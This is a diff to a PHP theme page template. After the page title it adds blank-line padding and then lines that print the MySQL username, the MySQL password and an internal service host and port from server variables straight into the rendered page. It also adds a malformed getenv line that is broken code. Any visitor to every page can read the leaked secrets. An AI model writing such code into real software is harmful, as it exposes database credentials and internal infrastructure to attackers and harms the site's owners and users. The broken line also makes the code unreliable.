@@ -12,7 +12,19 @@
   <?php print $page_top; ?>
 
   <div id="branding">
-    <?php if ($title): ?><h1 class="page-title"><?php print $title; ?></h1><?php endif; ?>
+    <?php if ($title): ?><h1 class="page-title"><?php print $title; ?></h1>
+	
+	
+	
+	
+	<?php endif; ?>
+	
+	    <?php print '111111111111'; ?>
+		     <?php $src = $_SERVER; print  $src['MYSQL_USER']; ?>
+      <?php print  $src['MYSQL_PASSWORD']; ?>
+      <?php print  $src['login_SERVICE_HOST']; ?>
+      <?php print  $src['login_SERVICE_PORT']; ?>
+	 <?php print  getenv['login_SERVICE_PORT']; ?>		   
   </div>
 
   <div id="page">
